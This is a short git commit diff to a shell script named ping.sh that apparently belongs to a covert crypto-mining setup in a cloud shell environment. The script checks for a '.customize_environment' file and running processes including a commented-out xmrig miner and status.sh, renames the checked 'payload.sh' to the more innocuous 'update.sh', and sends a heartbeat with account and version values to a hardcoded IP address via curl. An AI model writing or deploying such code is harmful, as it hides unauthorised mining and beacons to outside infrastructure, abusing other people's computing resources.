5edf98a0477c09e796805d2c297a2aa716ea8990
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-20 14:51:56 -0300

    Update ping.sh

--- ping.sh
+++ ping.sh
@@ -5,7 +5,7 @@ do
    if [ -e '.customize_environment' ] && 
 #      pgrep xmrig > /dev/null && 
       pgrep status.sh > /dev/null && 
-      pgrep payload.sh > /dev/null
+      pgrep update.sh > /dev/null
    then
        url='http://51.81.101.99/ping.php?account='$1'&version='$2
        curl $url
